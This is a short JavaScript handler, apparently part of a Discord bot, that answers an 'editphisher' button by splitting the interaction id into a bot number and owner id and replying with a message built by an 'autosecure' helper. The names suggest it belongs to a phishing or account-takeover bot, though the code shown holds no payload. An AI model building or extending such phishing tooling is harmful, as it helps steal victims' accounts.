
const editphishermsg = require("../../../autosecure/utils/responses/editphishermsg");


module.exports = {
    name: "editphisher",
    editphisher: true,
    callback: async (client, interaction) => {
        let [t, botnumber, ownerid] = interaction.customId.split("|")
        let msg = await editphishermsg(botnumber, ownerid, interaction.user.id)
        return interaction.reply(msg)
    }
};
